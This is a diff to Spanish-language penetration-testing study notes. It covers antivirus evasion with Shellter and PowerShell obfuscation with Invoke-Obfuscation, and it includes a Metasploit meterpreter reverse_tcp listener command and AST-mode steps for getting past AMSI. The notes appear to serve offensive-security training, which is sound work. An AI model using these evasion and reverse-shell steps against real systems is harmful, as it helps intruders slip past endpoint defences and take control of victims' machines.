@@ -222,11 +222,9 @@ cd ../../../
 pwd
 ls
 cat flag.txt
-
 ```
-### ~ AV Evasion with Shellter
 
-#### Tecnicas de evasion en disco.
+#### AV Evasion with Shellter
 
 - Encoding: Convierte el payload a otro formato — por ejemplo Base64 — para que los bytes sean diferentes. El problema es que los AV modernos también conocen los encoders más comunes como shikata_ga_nai de Metasploit, así que solos ya no funcionan bien. Útil como capa adicional, no como técnica única.
 - Obfuscation: Cambia la apariencia del código sin cambiar lo que hace — renombra variables, agrega código basura, parte strings, cambia el orden. Muy usado en PowerShell porque el AV analiza el texto del script antes de ejecutarlo.
@@ -265,6 +263,42 @@ sudo wine shellter.exe
 # En Kali tener el listener activo antes de ejecutar en la víctima:
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <puerto>; run"
 ```
+
+#### Obfuscating PowerShell Code
+
+```bash
+# OBFUSCATING POWERSHELL CODE CON INVOKE-OBFUSCATION
+# Los AV/EDR analizan scripts PS antes de ejecutarlos (via AMSI)
+# Invoke-Obfuscation modifica la estructura del código para evadir esa detección
+# sin cambiar lo que el script hace
+
+# Instalación de PowerShell en Kali
+sudo apt-get install powershell -y
+
+# Uso
+pwsh                                    # abrir PowerShell en Kali
+cd ./Invoke-Obfuscation/
+Import-Module ./Invoke-Obfuscation.psd1 # cargar el módulo
+cd ..
+Invoke-Obfuscation                      # iniciar la herramienta
+
+# Dentro de Invoke-Obfuscation:
+SET SCRIPTPATH <ruta del .ps1>  # script que queremos ofuscar
+AST                             # modo Abstract Syntax Tree — ofusca la estructura
+                                # lógica del código, no solo el texto
+                                # es el modo más efectivo contra AMSI
+ALL                             # aplicar todas las técnicas de ofuscación AST
+1                               # confirmar — devuelve el script ofuscado
+
+# Otros modos disponibles (menos efectivos que AST):
+# TOKEN    — ofusca partes individuales (strings, comandos)
+# STRING   — ofusca strings dentro del código
+# ENCODING — codifica el script completo
+# COMPRESS — comprime y ofusca
+
+# Output: script .ps1 con el mismo comportamiento pero irreconocible para el AV
+```
+
 
 ## 02 - Client-Side Attacks
 ## 03 - Web Application Penetration Testing
